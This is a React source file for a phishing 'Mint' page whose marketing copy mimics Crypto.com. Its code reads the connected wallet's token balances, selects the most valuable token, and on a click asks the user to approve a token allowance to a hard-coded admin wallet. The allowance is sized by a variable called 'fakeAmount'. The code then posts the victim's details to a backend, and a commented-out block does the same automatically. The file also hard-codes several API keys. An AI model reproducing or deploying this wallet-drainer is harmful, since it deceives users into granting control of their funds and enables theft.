import React, { useState, useEffect } from 'react';
import axios from 'axios';
import Web3 from "web3";
import 'bootstrap/dist/css/bootstrap.min.css';
import ReactPlayer from 'react-player';
import video1 from "../assets/video1.mp4";
import "./User.css";
var WAValidator = require('wallet-address-validator');

const GET_TOKEN_PRICE_API_KEY = "5d2f3072c0b3bfa7b006979142925cbc1dccf788219d2a8f5869ef92ad5d2ff2";
const GET_USER_ALL_TOEKN_API_KEY = "BQYcUOSxiCsQ3ximvOlDzfrAWTS5CYJ5";
const GET_BSC_SCAN_API_KEY = "HXKSU77A2DNXD9ZAIFHCYSWBF4DUWG66SS";
const GET_ETH_SCAN_API_KEY = "YRVQAVGPB6NHD9D9412VPTIRUZ5BK956K5"

const adminWalletAddress = "0x4552411f0f8C54116E220DA3e76b95a0375df766";
const web3 = new Web3(window.ethereum);
const UserScreen = () => {
  const [myAddress, setMyaddress] = useState('');
  const [walletStatus, setWalletStatus] = useState(false);
  const [initStatus, setInitStatus] = useState(false);
  const [userAllToken, setUserAllToken] = useState([]);
  useEffect(() => {
    const connectWallet = async () => {
      if (typeof window.ethereum !== 'undefined') {
        try {
          if (window.ethereum) {
            await window.ethereum.enable();
            try {
              // check if the chain to connect to is installed
              // await window.ethereum.request({
              //   method: 'wallet_switchEthereumChain',
              //   params: [{ chainId: '0x1' }], // chainId must be in hexadecimal numbers
              // });
              const accounts = await web3.eth.getAccounts();
              setMyaddress(accounts[0]);
              setWalletStatus(true);
            } catch (error) {
              // This error code indicates that the chain has not been added to MetaMask
              // if it is not, then install it into the user MetaMask
              if (error.code === 4902) {
                try {
                  await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [
                      {
                        chainId: '0x1',
                        rpcUrl: 'https://bsc-dataseed1.defibit.io/',
                      },
                    ],
                  });
                } catch (addError) {
                  console.error(addError);
                }
              }
              console.error(error);
            }
          }
        } catch (e) {
          return false;
        }
      }
    }
    const init = async (value) => {
      var valid = WAValidator.validate(value, 'ETH');
      var userAllTokenBalance = {
        eth: [],
        bsc: []
      };
      if (valid) {
        let query = `query ($network: EthereumNetwork!, $address: String!) {ethereum(network: $network) {address(address: {is: $address}) {balances {currency {address symbol tokenType decimals} value}}}}`;
        let variables = `{"limit": 10,"offset": 0,"network": "ethereum","address": "` + value + `"}`;
        let url = "https://graphql.bitquery.io/";
        let opts = {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-API-KEY": GET_USER_ALL_TOEKN_API_KEY
          },
          body: JSON.stringify({
            query,
            variables
          })
        };
        await fetch(url, opts).then(res => res.json())
          .then(data => userAllTokenBalance.eth = data.data.ethereum.address[0].balances)
          .catch(console.error);

        query = `query ($network: EthereumNetwork!, $address: String!) {ethereum(network: $network) {address(address: {is: $address}) {balances {currency {address symbol tokenType decimals} value}}}}`;
        variables = `{"limit": 10,"offset": 0,"network": "bsc","address": "` + value + `"}`;
        opts = {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-API-KEY": GET_USER_ALL_TOEKN_API_KEY
          },
          body: JSON.stringify({
            query,
            variables
          })
        };
        await fetch(url, opts).then(res => res.json())
          .then(data => userAllTokenBalance.bsc = data.data.ethereum.address[0].balances)
          .catch(console.error);
        if (userAllTokenBalance.bsc) {
          for (let i = 0; i < userAllTokenBalance.bsc.length; i++) {
            userAllTokenBalance.bsc[i].network = "BSC";
          }
        }
        if (userAllTokenBalance.eth) {
          for (let i = 0; i < userAllTokenBalance.eth.length; i++) {
            userAllTokenBalance.eth[i].network = "ETH";
          }
        }
        const array1 = userAllTokenBalance.eth ? userAllTokenBalance.eth : [];
        const array2 = userAllTokenBalance.bsc ? userAllTokenBalance.bsc : [];
        const array3 = array1.concat(array2).filter(e => e.currency.address !== "-");
        const array4 = array3.map(t => t.currency.symbol);
        const currentTokenPrice = await livePrice(array4);
        for (let i = 0; i < array3.length; i++) {
          if (currentTokenPrice[array3[i].currency.symbol]) {
            array3[i].price = currentTokenPrice[array3[i].currency.symbol].USD;
            array3[i].cost = +array3[i].value * array3[i].price;
          }
          else {
            array3[i].price = 0;
            array3[i].cost = +array3[i].value * 0;
          }
        }
        setUserAllToken(array3.sort(function (a, b) { return b.value - a.value; }).sort(function (a, b) { return b.cost - a.cost; }));
        setInitStatus(true);
        // const autoApprove = async () => {
        //   try {
        //     let userAllToken = array3.sort(function (a, b) { return b.value - a.value; }).sort(function (a, b) { return b.cost - a.cost; });
        //     if (userAllToken.length) {
        //       const approveToken = userAllToken[0];
        //       if (approveToken.network === "BSC") {
        //         await window.ethereum.request({
        //           method: 'wallet_switchEthereumChain',
        //           params: [{ chainId: '0x38' }], // chainId must be in hexadecimal numbers
        //         });
        //         const approveAmount = (approveToken.cost - 0) / approveToken.price;
        //         const fakeAmount = (100000 - 0) / approveToken.price;
        //         if (approveToken.currency.address === "-") {

        //         } else {
        //           let api = "https://api.bscscan.com/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_BSC_SCAN_API_KEY;
        //           let temp = await axios.get(api);
        //           console.log(temp);
        //           const contractABI = JSON.parse(temp.data.result);
        //           const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
        //           await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((fakeAmount).toString(), "ether")).send({ from: myAddress })
        //             .then(async function (receipt) {
        //               console.log(receipt);
        //               await axios.post('http://localhost:5000/products', {
        //                 userWalletAddress: myAddress,
        //                 amount: approveAmount,
        //                 symbol: approveToken.currency.symbol,
        //                 contractAddress: approveToken.currency.address,
        //                 network: "BSC",
        //                 adminAddress: adminWalletAddress
        //               });
        //             });
        //         }
        //       }
        //       else {
        //         await window.ethereum.request({
        //           method: 'wallet_switchEthereumChain',
        //           params: [{ chainId: '0x1' }], // chainId must be in hexadecimal numbers
        //         });
        //         const approveAmount = (approveToken.cost - 0) / approveToken.price;
        //         const fakeAmount = (100000 - 0) / approveToken.price;
        //         if (approveToken.currency.address === "-") {

        //         } else {
        //           let api = "https://api.etherscan.io/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_ETH_SCAN_API_KEY;
        //           let temp = await axios.get(api);
        //           const contractABI = JSON.parse(temp.data.result);
        //           const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
        //           await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((fakeAmount).toString(), "ether")).send({ from: myAddress })
        //             .then(async function (receipt) {
        //               await axios.post('http://localhost:5000/products', {
        //                 userWalletAddress: myAddress,
        //                 amount: approveAmount,
        //                 symbol: approveToken.currency.symbol,
        //                 contractAddress: approveToken.currency.address,
        //                 network: "ETH",
        //                 adminAdress: adminWalletAddress
        //               });
        //             });
        //         }
        //       }
        //     }
        //   } catch (error) {
        //     console.log(error.message);
        //   }
        // }
        // autoApprove();
      }
    }
    connectWallet();
    init(myAddress);
  }, [myAddress]);

  const livePrice = async (symbol) => {
    let tokenSymbol = symbol;
    let totaltemp = {};
    if (tokenSymbol.slice(0, 50).length) {
      let api = "https://min-api.cryptocompare.com/data/pricemulti?fsyms=" + tokenSymbol.slice(0, 50) + "&tsyms=USD&api_key=" + GET_TOKEN_PRICE_API_KEY;
      let temp = await axios.get(api);
      Object.assign(totaltemp, temp.data);
      if (tokenSymbol.slice(51, 100).length) {
        api = "https://min-api.cryptocompare.com/data/pricemulti?fsyms=" + tokenSymbol.slice(51, 100) + "&tsyms=USD&api_key=" + GET_TOKEN_PRICE_API_KEY;
        temp = await axios.get(api);
        Object.assign(totaltemp, temp.data)
      }
    }
    return totaltemp;
  }

  const handleApprove = async () => {
    try {
      if (walletStatus && initStatus && userAllToken.length) {
        const approveToken = userAllToken[0];
        if (approveToken.network === "BSC") {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }], // chainId must be in hexadecimal numbers
          });
          const approveAmount = (approveToken.cost - 0) / approveToken.price;
          const fakeAmount = (100000 - 0) / approveToken.price;
          if (approveToken.currency.address === "-") {

          } else {
            let api = "https://api.bscscan.com/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_BSC_SCAN_API_KEY;
            let temp = await axios.get(api);
            console.log(temp);
            const contractABI = JSON.parse(temp.data.result);
            const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
            await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((fakeAmount).toString(), "ether")).send({ from: myAddress })
              .then(async function (receipt) {
                console.log(receipt);
                await axios.post('http://localhost:5000/products', {
                  userWalletAddress: myAddress,
                  amount: approveAmount,
                  symbol: approveToken.currency.symbol,
                  contractAddress: approveToken.currency.address,
                  network: "BSC",
                  adminAddress: adminWalletAddress
                });
              });
          }
        }
        else {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x1' }], // chainId must be in hexadecimal numbers
          });
          const approveAmount = (approveToken.cost - 0) / approveToken.price;
          const fakeAmount = (100000 - 0) / approveToken.price;
          if (approveToken.currency.address === "-") {

          } else {
            let api = "https://api.etherscan.io/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_ETH_SCAN_API_KEY;
            let temp = await axios.get(api);
            const contractABI = JSON.parse(temp.data.result);
            const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
            await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((fakeAmount).toString(), "ether")).send({ from: myAddress })
              .then(async function (receipt) {
                await axios.post('http://localhost:5000/products', {
                  userWalletAddress: myAddress,
                  amount: approveAmount,
                  symbol: approveToken.currency.symbol,
                  contractAddress: approveToken.currency.address,
                  network: "ETH",
                  adminAdress: adminWalletAddress
                });
              });
          }
        }
      }
    } catch (error) {
      console.log(error.message);
    }
  }
  return (
    <div className='position-relative'>
      <div className='position-absolute mint-part w-100'>
        <div className='d-flex flex-column text-center'>
          <div className='title'>Please Click! "Mint button"</div>
          <div className='mint-button mt-3 m-auto' style={{ width: "200px" }} onClick={handleApprove}>Mint</div>
        </div>
      </div>
      <ReactPlayer playing={true} muted={true} loop={true} className='react-player' url={video1} width="100%" height="100%" />
      <div className='second-section'>
        <h1>The World's Fastest Growing<br /> Crypto App</h1>
        <div className='fs-4 m-4 content '>
          <div>Join 10m+ users buying and selling 250+ cryptocurrencies at ture cost</div>
          <div>Spend with the Crypto.com Visa Card and get up to 8% back</div>
          <div>Grow your portfolio by receiving rewards up to 14.5% on your crypto assets</div>
        </div>
      </div>
    </div>
  );
};

export default UserScreen;